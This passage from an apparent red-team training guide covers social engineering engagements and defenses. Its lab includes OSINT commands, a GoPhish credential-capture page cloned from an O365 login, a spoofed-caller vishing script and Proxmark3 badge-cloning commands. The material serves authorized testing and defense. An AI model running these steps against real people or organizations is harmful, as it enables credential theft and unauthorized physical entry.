Social engineering campaigns within red team operations typically target one or more of these objectives:

1. **Initial access** — obtain credentials or system access through human interaction
2. **Physical access** — gain unauthorized entry to facilities
3. **Information disclosure** — elicit sensitive information through pretexting
4. **Process validation** — test whether organizational procedures are followed
5. **Awareness measurement** — quantify organizational susceptibility to SE attacks

#### 8.1.2 Rules of Engagement

```yaml
# SE Campaign Rules of Engagement Template
campaign:
  name: "Project [Codename]"
  authorization_date: "2025-06-15"
  campaign_window: "2025-07-01 to 2025-07-31"
  authorizing_officer:
    name: "[Name]"
    title: "[CISO/CTO/CEO]"
    phone: "+1-XXX-XXX-XXXX"  # 24/7 emergency contact
    email: "[email]"

  scope:
    phishing:
      authorized: true
      targets: "All employees except C-suite and legal"
      excluded_individuals:
        - "[Names of excluded people]"
      payload_restrictions: "Credential capture only — no malware execution"
    vishing:
      authorized: true
      targets: "Helpdesk, IT, Finance departments"
      recording: false  # Check two-party consent laws
      caller_id_spoofing: true
    physical:
      authorized: true
      locations:
        - "123 Main St — All floors"
        - "456 Oak Ave — Lobby and parking only"
      techniques:
        - tailgating
        - badge_cloning
        - lock_picking  # Non-destructive only
        - dumpster_diving
      excluded_areas:
        - "Data center (active production)"
        - "Executive floor after hours"

  safety:
    distressed_target_protocol: "Immediately cease interaction, offer genuine assistance"
    law_enforcement_protocol: "Present authorization letter, contact [authorizing officer]"
    injury_protocol: "Standard first aid, call 911, contact [authorizing officer]"
    data_handling: "All captured credentials encrypted with AES-256, stored on
                    encrypted drive, destroyed within 30 days of report delivery"

  deconfliction:
    blue_team_aware: false  # True = announced, False = unannounced
    soc_notification: "CISO will handle if SOC detects campaign"
    incident_response_override: "CISO will intervene if IR team escalates"
```

#### 8.1.3 Safety Procedures

- **Buddy system:** Never conduct physical penetration testing alone. A partner provides safety, witness capability, and assistance if confronted.
- **Check-in schedule:** Tester checks in with the control team at defined intervals. Missed check-in triggers escalation.
- **Emergency code word:** Pre-established word to end an engagement immediately via text or call.
- **Legal carry:** Authorization letter on person at all times during physical testing. Laminated copy in wallet plus digital copy on phone.
- **No real weapons:** Even if impersonating security/law enforcement, never carry anything that could be construed as a weapon.

### 8.2 Multi-Vector Campaigns

The most effective red team SE operations combine multiple vectors to simulate realistic adversary behavior:

```
Campaign timeline example — 4-week multi-vector operation:

Week 1: OSINT & Reconnaissance
├── Days 1-3: People OSINT (LinkedIn, social media, breach data)
├── Days 3-5: Organization OSINT (tech stack, vendors, structure)
└── Days 5-7: Physical recon (perimeter, entries, employee behavior)

Week 2: Phishing Campaign
├── Day 8: Infrastructure setup (GoPhish, phishing domain, SPF/DKIM)
├── Days 9-10: Template development and testing
├── Day 11: Launch Wave 1 — broad phishing (200 targets)
├── Day 13: Launch Wave 2 — spear-phishing (20 high-value targets)
└── Day 14: Analyze results, identify credential captures

Week 3: Vishing & Smishing
├── Days 15-17: Vishing campaign against helpdesk and IT
├── Days 17-18: Smishing campaign against mobile-heavy departments
├── Day 19: Use captured credentials for further access
└── Day 20: Attempt lateral movement with harvested credentials

Week 4: Physical Assessment
├── Days 22-23: Badge cloning attempts (Proxmark3 in common areas)
├── Day 24: Physical entry attempt (tailgating + cloned badge)
├── Day 25: After-hours entry attempt
├── Day 26: Dumpster diving
└── Days 27-28: Report compilation
```

### 8.3 Measuring Effectiveness

#### 8.3.1 Phishing Metrics

| Metric | Calculation | Industry Benchmark |
|---|---|---|
| Email open rate | Opened / Delivered | 30-50% |
| Click rate | Clicked / Delivered | 10-30% |
| Credential submission rate | Submitted / Clicked | 30-60% of clickers |
| Report rate | Reported to IT / Delivered | 2-15% |
| Time to first click | Min(click_time - send_time) | 1-5 minutes |
| Time to first report | Min(report_time - send_time) | 15-60 minutes |
| Click-to-report ratio | Clicked / Reported | Target: <3:1 |

#### 8.3.2 Vishing Metrics

| Metric | Measurement |
|---|---|
| Information disclosure rate | Targets who disclosed any information / Total called |
| Credential capture rate | Targets who provided credentials / Total called |
| Average call duration | Mean time of successful calls |
| Suspicion rate | Targets who expressed suspicion / Total called |
| Escalation rate | Targets who escalated to security / Total called |
| Social engineering depth | How many requests the target fulfilled before stopping |

#### 8.3.3 Physical Assessment Metrics

| Metric | Measurement |
|---|---|
| Entry success rate | Successful entries / Entry attempts |
| Time to entry | Time from first attempt to successful access |
| Challenge rate | Times challenged / Total interactions |
| Escort compliance | Times properly escorted / Times that required escort |
| Badge clone success | Cards successfully cloned / Clone attempts |
| Dumpster findings | Sensitive documents found / Hours spent |

### 8.4 Deconfliction

Deconfliction ensures the red team's SE campaign doesn't interfere with real security incidents or other ongoing operations.

```
Deconfliction protocol:

1. Pre-campaign:
   - Obtain list of ongoing security operations, active IR incidents
   - Agree on campaign identifiers that CISO can use to identify RT activity
   - Establish direct communication channel (encrypted, out-of-band)
   - Define escalation thresholds (when does CISO intervene?)

2. During campaign:
   - All RT phishing uses specific headers or tracking parameters identifiable
     by the CISO (but not the SOC if unannounced)
   - RT physical testers carry specific badge or identifier known only to CISO
   - Daily deconfliction check-in with CISO: "Are any of our activities
     causing real operational impact?"
   - If RT activity triggers IR response that could impact business:
     CISO calls timeout, RT pauses that vector

3. If blue team detects and responds:
   - This IS a valid test result — document the detection and response
   - CISO decides whether to reveal or let the response play out
   - If blue team begins containment that could impact production:
     CISO intervenes and reveals (but documents response effectiveness)
```

### 8.5 Trophy Collection — Evidence Documentation

Every successful social engineering action must be documented to the standard required for the final report:

```
Trophy documentation standard:

For each successful action, record:
1. UTC ISO 8601 timestamp
2. Target identifier (anonymized in report: "Employee #14")
3. Vector used (phishing, vishing, physical, etc.)
4. Pretext employed
5. Specific information/access obtained
6. Screenshot or photograph (sanitized of PII for report)
7. Time elapsed from initiation to success
8. Whether the target showed any suspicion
9. Whether the action was detected by security controls

Evidence types:
- Screenshots of credential capture (mask actual passwords in report)
- Call recordings (if authorized and legal — check two-party consent)
- Photographs of physical access (show locations reached without revealing
  individuals' faces unless authorized)
- Copies of documents obtained from dumpster diving (redact PII)
- Proxmark3 logs showing successful badge reads/clones
- GoPhish campaign results export (CSV/JSON)
```

---

## 9. Defense Against Social Engineering

### 9.1 Security Awareness Training

#### 9.1.1 Program Design

Effective security awareness training is continuous, measurable, and behavior-focused:

```
Training program structure:

Tier 1 — Baseline (all employees, annual + onboarding):
├── Social engineering concepts and common attacks
├── Phishing identification (URLs, sender verification, urgency red flags)
├── Physical security awareness (tailgating, badge discipline, visitor protocols)
├── Reporting procedures (how to report suspicious activity)
└── Assessment: simulated phishing test

Tier 2 — Role-specific (quarterly):
├── Finance: BEC/wire fraud detection, dual-authorization procedures
├── IT/Helpdesk: vishing defense, credential verification procedures
├── Executives: CEO fraud targeting, deepfake awareness
├── Reception/Security: visitor management, social engineering red flags
└── HR: pretexting using HR-specific scenarios

Tier 3 — Champions program (monthly):
├── Volunteer security champions in each department
├── Advanced training on current threats
├── Responsible for peer education and culture building
├── Metrics: department-level phishing click rates
└── Recognition program (not punishment-based)
```

#### 9.1.2 Phishing Simulations

```
Simulation program design:

Frequency: Monthly, varied difficulty
├── Easy: obvious red flags (misspellings, generic greeting, suspicious URL)
├── Medium: contextually relevant, minor red flags (lookalike domain, urgency)
├── Hard: spear-phished with OSINT, closely matches legitimate communications
└── Expert: AitM-style, clone of actual organizational emails

Response to clicks:
├── Immediate: redirect to training page explaining the simulation
├── 24 hours: manager notification (for coaching, not punishment)
├── Weekly: aggregate reports to CISO
├── Quarterly: trend analysis and program adjustment
└── NEVER: public shaming, punitive action, termination threat

Simulation metrics dashboard:
├── Click rate trend (monthly, quarterly, annual)
├── Click rate by department
├── Click rate by difficulty level
├── Time-to-click distribution
├── Report rate (goal: increase over time)
├── Repeat clickers (identify for additional 1:1 training)
└── Improvement trajectory per department
```

**Awareness training metrics:**

| Metric | Target | Red Flag |
|---|---|---|
| Annual click rate | <5% | >20% |
| Report rate | >30% | <5% |
| Time to first report | <10 min | >60 min |
| Repeat clicker rate | <3% | >10% |
| Training completion | >95% | <80% |
| Awareness survey score | >80% | <60% |

### 9.2 Technical Controls

#### 9.2.1 Multi-Factor Authentication

MFA is the single most effective technical control against credential-based social engineering, but it is not a silver bullet (see Section 4.1 for AitM bypass):

```
MFA hierarchy (strongest to weakest):

1. FIDO2/WebAuthn hardware keys (YubiKey, Google Titan)
   - Phishing-resistant: bound to origin domain
   - Immune to AitM attacks (Evilginx2 cannot relay FIDO2 challenges)
   - No shared secrets to intercept

2. Platform authenticators (Windows Hello, macOS Touch ID, passkeys)
   - Phishing-resistant when properly implemented
   - Bound to device + origin domain

3. Authenticator apps (TOTP — Google Authenticator, Microsoft Authenticator)
   - Vulnerable to AitM real-time relay
   - Better than SMS but not phishing-resistant

4. Push notifications (Microsoft Authenticator push, Duo push)
   - Vulnerable to push fatigue attacks (MFA bombing)
   - Improved by number matching (user must enter a code shown on login screen)

5. SMS/voice OTP
   - Vulnerable to SIM swapping, SS7 interception, real-time AitM relay
   - Weakest MFA — but still better than no MFA
```

#### 9.2.2 Email Security

```
Email security stack:

1. SPF (Sender Policy Framework):
   - Validates sending server IP against domain's SPF record
   - Prevents direct domain spoofing
   - Does not prevent lookalike domain attacks

2. DKIM (DomainKeys Identified Mail):
   - Cryptographic signature on email headers/body
   - Ensures message integrity and authenticity
   - Does not prevent display name spoofing

3. DMARC (Domain-based Message Authentication, Reporting, Conformance):
   - Policy layer on top of SPF + DKIM
   - Configure: p=reject (strongest — reject failing emails)
   - Enables reporting of authentication failures

   DNS record:
   _dmarc.company.com. IN TXT "v=DMARC1; p=reject; rua=mailto:dmarc@company.com;
   ruf=mailto:dmarc-forensic@company.com; pct=100; adkim=s; aspf=s"

4. URL rewriting / Safe Links:
   - Microsoft Defender for Office 365, Proofpoint URL Defense, Mimecast
   - Rewrites URLs to proxy through security scanning
   - Time-of-click analysis (catches delayed payload activation)

5. Attachment sandboxing:
   - Detonates attachments in isolated VMs
   - Detects malicious behavior (network callbacks, file system changes)
   - Bypassed by: HTML smuggling, password-protected archives, delayed payloads

6. AI/ML-based anomaly detection:
   - Behavioral analysis of email patterns
   - Detects BEC by analyzing writing style changes
   - Flags unusual sender-recipient relationships
```

### 9.3 Process Controls

```
Verification procedures for sensitive actions:

1. Wire transfer verification:
   ├── Dual authorization required for all transfers >$X
   ├── Callback verification to a known number (NOT one provided in the request)
   ├── Verbal challenge-response code for phone authorizations
   ├── 24-hour hold on new payee accounts
   └── No email-only authorization for wire transfers — ever

2. Credential reset verification:
   ├── Identity verification via multiple factors (badge number + 
   │   manager name + personal question from HR records)
   ├── Reset sent only to pre-registered recovery methods
   ├── No credential provided verbally over the phone
   └── Logged and reviewed by security team

3. Physical access request verification:
   ├── Visitor pre-registration required (no walk-ins to secure areas)
   ├── Escort required at all times in secure areas
   ├── Photo ID verification against pre-registration
   ├── Visitor badge with distinct color/format from employee badges
   └── Visitor badge automatically expires (timed badge or daily return)

4. Information disclosure controls:
   ├── Classification schema (Public, Internal, Confidential, Restricted)
   ├── Need-to-know verification before sharing Confidential or above
   ├── No organizational structure details to external callers
   ├── "I need to verify this request — let me call you back" training
   └── Incident reporting for any suspected SE attempt
```

### 9.4 Physical Controls

```
Physical security layered defense:

Layer 1 — Perimeter:
├── Fencing with anti-climb features
├── Vehicle barriers at entry points
├── CCTV with motion detection and recording
├── Lighting (eliminate dark zones)
└── Signage (surveillance notice, authorized access only)

Layer 2 — Building Entry:
├── Mantraps / anti-tailgating vestibules at primary entrances
├── Turnstiles or optical barriers for high-traffic entrances
├── Badge + PIN (two-factor physical access)
├── Visitor management system (pre-registration, photo capture, badge printing)
├── Security guard with challenge protocol training
└── Badge readers with anti-passback (prevents badge sharing)

Layer 3 — Internal Zones:
├── Progressive access control (more restricted deeper in)
├── Separate badge access per zone (lobby → office → server room → cage)
├── Re-authentication required for sensitive areas
├── Camera coverage at zone transitions
└── Clean desk policy enforcement

Layer 4 — High-Security Areas:
├── Biometric access (fingerprint, retina, palm vein)
├── Two-person integrity (both must badge in)
├── Man-trap with weight sensor (single-person verification)
├── 24/7 CCTV with active monitoring
└── Intrusion detection (motion, vibration, thermal)
```

### 9.5 Organizational Culture

The most effective defense against social engineering is a security-positive culture where employees feel empowered to question, verify, and report:

```
Culture building program:

1. Reporting without punishment:
   - Anonymous reporting channel
   - No negative consequences for falling for simulated phishing
   - Public recognition for reporting real SE attempts
   - "See something, say something" framing

2. Security champions program:
   - Volunteer representatives in each department
   - Monthly advanced security briefings
   - Responsible for department-level awareness
   - Direct channel to security team
   - Recognition and minor incentives (not large enough to create perverse
     incentives)

3. Regular communication:
   - Monthly security newsletter (real incidents, anonymized)
   - Quarterly all-hands security update
   - Just-in-time alerts when new SE campaigns are trending
   - Positive framing: "Here's what our employees caught this month"

4. Executive engagement:
   - CISO presents to board quarterly
   - Executives participate in simulations (no exemptions)
   - Executive sponsorship of awareness programs
   - Budget allocation reflects SE risk priority
```

---

## 10. Lab: Complete SE Engagement

This lab walks through a complete authorized social engineering engagement from OSINT through reporting. All activities are conducted within the scope of a signed authorization agreement.

### 10.1 Phase 1 — OSINT Gathering

**Objective:** Build a comprehensive intelligence dossier on the target organization.

```bash
# Step 1: Domain and email reconnaissance
theHarvester -d targetcorp.com -b all -l 500 -f targetcorp_harvest

# Step 2: Email pattern discovery
curl -s "https://api.hunter.io/v2/domain-search?domain=targetcorp.com&api_key=$HUNTER_KEY" \
    | jq '.data.pattern'
# Output: "{first}.{last}"

# Step 3: Employee enumeration from LinkedIn
# Use linkedin2username or manual collection
# Save to: osint/employees.csv
# Format: FirstName,LastName,Title,Department,Email

# Step 4: Technology stack from job postings
# Search LinkedIn, Indeed, Glassdoor for targetcorp
# Document: SIEM (Splunk), EDR (CrowdStrike), Email (O365),
#           IdP (Azure AD), VPN (Palo Alto GlobalProtect)

# Step 5: Breach exposure check
h8mail -t targetcorp.com -bc /path/to/breach-data/

# Step 6: Physical location intelligence
# Google Earth: Perimeter, entries, cameras
# Street View: Lobby visibility, guard presence, badge readers
# Document in: osint/physical_recon.md

# Step 7: Social media intelligence
# Key employees' social media presence
# Document: interests, recent activity, communication style
# Save to: osint/target_profiles/
```

**OSINT output deliverables:**

```
osint/
├── employees.csv          # Employee list with titles and emails
├── email_patterns.txt     # Discovered email format
├── tech_stack.md          # Technology stack intel
├── breach_exposure.json   # Breach data findings
├── physical_recon/
│   ├── perimeter.md       # Perimeter assessment
│   ├── entry_points.md    # Entry point catalog
│   ├── photos/            # Recon photographs
│   └── schedule.md        # Guard/delivery schedules observed
└── target_profiles/
    ├── target_01.md       # IT Director — high-value
    ├── target_02.md       # Helpdesk lead — vishing target
    └── target_03.md       # Receptionist — physical access
```

### 10.2 Phase 2 — Phishing Campaign with GoPhish

```bash
# Step 1: Infrastructure setup
# Domain: targetcorp-portal.com (registered 30+ days ago)
# VPS: cloud provider with clean IP reputation
# TLS: Let's Encrypt certificate for phishing domain

# Step 2: Configure DNS
# A record: targetcorp-portal.com → VPS_IP
# MX record: targetcorp-portal.com → VPS_IP
# SPF: "v=spf1 ip4:VPS_IP ~all"
# DKIM: configured via OpenDKIM
# DMARC: "v=DMARC1; p=none"

# Step 3: GoPhish configuration
# Import targets from osint/employees.csv
# Configure sending profile with relay SMTP

# Step 4: Create credential capture landing page
# Clone targetcorp's actual O365 login page
# GoPhish: Landing Pages → Import Site
# URL: https://login.microsoftonline.com
# Capture credentials: ✓
# Capture passwords: ✓
# Redirect: https://office.com (after capture)

# Step 5: Design email template
# Pretext: "IT Security: Mandatory password reset due to policy update"
# Include: real IT Director's name, real company branding
# Call to action: "Reset your password within 48 hours"
# Link: https://targetcorp-portal.com/reset?rid={{.RId}}

# Step 6: Launch campaign
# Schedule: Tuesday 10:00 AM local time (highest open rates)
# Stagger: 10 emails per hour (avoid bulk detection)

# Step 7: Monitor results (GoPhish dashboard)
# Track: opens, clicks, submissions, reports
```

**GoPhish results analysis template:**

```
Campaign: Password Reset Phishing — Wave 1
Date: 2025-07-08 to 2025-07-10
Targets: 200 employees

Results:
├── Emails sent:        200
├── Emails opened:      134 (67.0%)
├── Links clicked:       47 (23.5%)
├── Credentials submitted: 28 (14.0%)
├── Reported to IT:       8 (4.0%)
├── Time to first click:  2 min 14 sec
├── Time to first report: 34 min
└── Click-to-report ratio: 5.9:1

Breakdown by department:
├── Engineering:  3/40 clicked (7.5%)  — lowest
├── Sales:       12/35 clicked (34.3%) — highest
├── Finance:      8/30 clicked (26.7%)
├── HR:           6/25 clicked (24.0%)
├── Operations:   9/35 clicked (25.7%)
└── Marketing:    9/35 clicked (25.7%)
```

### 10.3 Phase 3 — Vishing Campaign

```
Vishing campaign plan:

Targets: IT Helpdesk (5 analysts), Finance (3 staff)
Pretext: IT audit requiring verification of procedures

Call log template:
┌──────────────────────────────────────────────────────────────────┐
│ Call ID: VSH-001                                                │
│ Date/Time: 2025-07-15T14:23:00Z                                │
│ Target: Employee #07 (Helpdesk Analyst)                         │
│ Caller ID displayed: [Spoofed internal IT number]               │
│ Pretext: IT Director requested password reset audit             │
│                                                                  │
│ Script:                                                          │
│ "Hi [Name], I'm [Fake Name] from the IT audit team. [IT Dir]   │
│ asked us to verify the password reset process. Can you walk me  │
│ through what happens when someone calls in for a reset?"        │
│                                                                  │
│ Escalation:                                                      │
│ "Great, thanks. For the audit record, can you demonstrate by    │
│ looking up [fabricated employee name]'s account status?"         │
│                                                                  │
│ Result: TARGET DISCLOSED account lookup procedure,              │
│         confirmed identity verification requirements (name +    │
│         employee ID only — no MFA challenge for helpdesk reset) │
│                                                                  │
│ Suspicion level: None                                           │
│ Duration: 7 min 42 sec                                          │
│ Finding: CRITICAL — Helpdesk resets passwords with only name    │
│          and employee ID, both obtainable via OSINT              │
└──────────────────────────────────────────────────────────────────┘
```

### 10.4 Phase 4 — Physical Assessment with Badge Cloning

```bash
# Step 1: Badge reconnaissance
# Observe badge types in use: HID ProxCard II (125 kHz) identified
# from badge reader model visible at main entrance (HID multiCLASS)

# Step 2: Long-range badge capture
# Equipment: Proxmark3 RDV4 with extended antenna in backpack
# Location: Elevator bank during morning rush
# Duration: 45 minutes

# Results:
proxmark3> lf search
# [+] HID Prox TAG ID: 2004263f88 (6025) Format Len: 26bit
# [+] Facility Code: 118 Card Number: 3012

# Step 3: Clone badge
proxmark3> lf hid clone --r 2004263f88
# Cloned to T5577 card

# Step 4: Test cloned badge
# Approach: Side entrance, 7:15 AM (before main lobby guard arrives)
# Result: BADGE ACCEPTED — door opened
# Time inside: 12 minutes (documented camera coverage gaps,
#              unlocked server room, accessible network ports)

# Step 5: Evidence
# Photographs: badge reader, server room door (unlocked),
#              open network jacks, visible passwords on monitors
# Timestamp: 2025-07-22T07:15:00Z to 2025-07-22T07:27:00Z
# Challenged: NO — zero employee challenges during 12-minute visit
```

### 10.5 Phase 5 — Comprehensive Report

```markdown
# Social Engineering Assessment Report

## Executive Summary

TargetCorp's social engineering defenses were assessed across
phishing, vishing, and physical vectors over a 4-week period.
The assessment revealed critical vulnerabilities in all three
domains, with an overall organizational susceptibility rating
of HIGH.

Key findings:
- 14% of employees submitted credentials to a simulated phishing attack
- Helpdesk password reset procedures are exploitable via phone pretexting
  (name + employee ID — no MFA)
- Physical access was gained via badge cloning with zero employee challenges
- Only 4% of phishing targets reported the suspicious email to IT

## Finding Detail

### Finding 1: High Phishing Susceptibility
Severity: HIGH (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N — 8.1)
CWE: CWE-352 (Cross-Site Request Forgery — credential harvest analog)

Description: 14% of targeted employees (28/200) submitted credentials
to a simulated phishing page mimicking the organization's O365 login.

Evidence: GoPhish campaign results (Appendix A)

Impact: An attacker would obtain valid credentials for 28 accounts,
enabling email access, internal system access, and potential lateral
movement.

Recommendation:
1. Deploy FIDO2/WebAuthn as the primary MFA mechanism (phishing-resistant)
2. Implement monthly phishing simulations with progressive difficulty
3. Deploy email banner warnings for external-origin emails
4. Establish a one-click phishing report button in email clients
5. Targeted training for Sales department (34.3% click rate)

### Finding 2: Helpdesk Password Reset Exploitable via Vishing
Severity: CRITICAL (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N — 9.1)
CWE: CWE-287 (Improper Authentication)

Description: Helpdesk analysts reset passwords upon verification of
employee name and employee ID number — both obtainable through OSINT.
No MFA challenge, no callback verification, no manager approval.

Evidence: Vishing call log VSH-001 through VSH-005 (Appendix B)

Impact: Any attacker who obtains an employee's name and ID number
(publicly available on company badges, visible in lobby) can call the
helpdesk and obtain a password reset for that account.

Recommendation:
1. Implement MFA-based identity verification for all helpdesk resets
2. Require callback to the employee's registered phone number
3. Implement a cooldown period and manager notification for resets
4. Train helpdesk analysts on vishing detection techniques

### Finding 3: Physical Access via Badge Cloning
Severity: CRITICAL (CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — 6.8)
CWE: CWE-287 (Improper Authentication)

Description: Employee badges use unencrypted 125 kHz HID ProxCard II
technology. Badges were read at a distance of 50 cm using a concealed
Proxmark3 reader and cloned to writable cards. The cloned badge
provided access through the side entrance with no secondary
authentication (no PIN, no biometric).

Evidence: Proxmark3 logs, photographs of accessed areas (Appendix C)

Impact: Any individual with a $300 Proxmark3 can clone employee badges
in shared spaces (elevators, cafeteria) and gain unrestricted physical
access to the facility.

Recommendation:
1. Upgrade access control to encrypted protocol (HID iCLASS SE or SEOS,
   MIFARE DESFire EV2/EV3)
2. Implement badge + PIN at all entry points
3. Add biometric authentication for sensitive areas (server rooms, finance)
4. Deploy anti-tailgating vestibules at primary entrances
5. Train employees to challenge unfamiliar individuals in secure areas

### Finding 4: Low Phishing Report Rate
Severity: MEDIUM
CWE: N/A (Process/cultural deficiency)

Description: Only 4% of targets (8/200) reported the phishing email
to IT security. The organization's click-to-report ratio of 5.9:1
indicates that for every employee who reports a suspicious email,
nearly 6 click the malicious link.

Evidence: GoPhish campaign report rate data (Appendix A)

Impact: Real phishing attacks are unlikely to be detected through
employee reporting, reducing the SOC's ability to respond quickly
and potentially block campaigns in progress.

Recommendation:
1. Deploy a one-click "Report Phishing" button in all email clients
2. Provide positive feedback when employees report (automated
   "thank you" + monthly recognition)
3. Include reporting metrics in phishing simulations
4. Set organizational target: report rate >30% within 12 months

## Remediation Priority Matrix

| Finding | Severity | Effort | Timeline | Priority |
|---------|----------|--------|----------|----------|
| Helpdesk reset process | CRITICAL | Medium | 30 days | 1 |
| Badge technology upgrade | CRITICAL | High | 90 days | 2 |
| FIDO2 MFA deployment | HIGH | High | 120 days | 3 |
| Phishing report button | MEDIUM | Low | 14 days | 4 |
| Security awareness program | HIGH | Medium | Ongoing | 5 |

## Appendices

A. GoPhish Campaign Results (full CSV export)
B. Vishing Call Logs (VSH-001 through VSH-008)
C. Physical Assessment Evidence (photographs, Proxmark3 logs, timestamps)
D. OSINT Collection Summary (sanitized)
E. Rules of Engagement (signed authorization)
F. Tester Credentials and Methodology
```

### 10.6 Defensive Improvement Recommendations — Summary

```
Immediate (0-30 days):
├── Deploy phishing report button in email clients
├── Update helpdesk password reset procedures (add MFA verification)
├── Issue RFID-blocking badge holders to all employees
├── Enable external email banner ("This email originated outside the org")
└── Conduct targeted awareness training for high-click departments

Short-term (30-90 days):
├── Begin badge technology upgrade project (HID iCLASS SE / SEOS)
├── Implement monthly phishing simulations with progressive difficulty
├── Train helpdesk and reception staff on SE detection
├── Install anti-tailgating controls at primary entrances
├── Deploy DMARC p=reject for the organization's domain
└── Implement callback verification for all financial transactions

Medium-term (90-180 days):
├── Complete FIDO2/WebAuthn rollout for all employees
├── Launch security champions program
├── Complete badge technology upgrade
├── Implement badge + PIN at all entry points
├── Deploy AI-based email anomaly detection
└── Conduct follow-up SE assessment to measure improvement

Ongoing:
├── Monthly phishing simulations
├── Quarterly awareness training
├── Annual SE penetration test
├── Continuous monitoring of SE metrics (click rate, report rate)
└── Regular debrief sessions incorporating lessons from real incidents
```

---

## References and Further Reading

- Cialdini, R. B. (2021). *Influence, New and Expanded: The Psychology of Persuasion*. Harper Business.
- Hadnagy, C. (2018). *Social Engineering: The Science of Human Hacking*, 2nd Edition. Wiley.
- Mitnick, K. D. & Simon, W. L. (2003). *The Art of Deception*. Wiley.
- NIST SP 800-61 Rev. 2 — Computer Security Incident Handling Guide
- NIST SP 800-50 — Building an Information Technology Security Awareness and Training Program
- PTES — Penetration Testing Execution Standard: http://www.pentest-standard.org
- OWASP Social Engineering Prevention Cheat Sheet
- IETF RFC 7208 — Sender Policy Framework (SPF)
- IETF RFC 6376 — DomainKeys Identified Mail (DKIM)
- IETF RFC 7489 — DMARC
- FIDO Alliance — WebAuthn Specification: https://fidoalliance.org
- GoPhish documentation: https://docs.getgophish.com
- Evilginx2 documentation: https://github.com/kgretzky/evilginx2
- Proxmark3 documentation: https://github.com/RfidResearchGroup/proxmark3
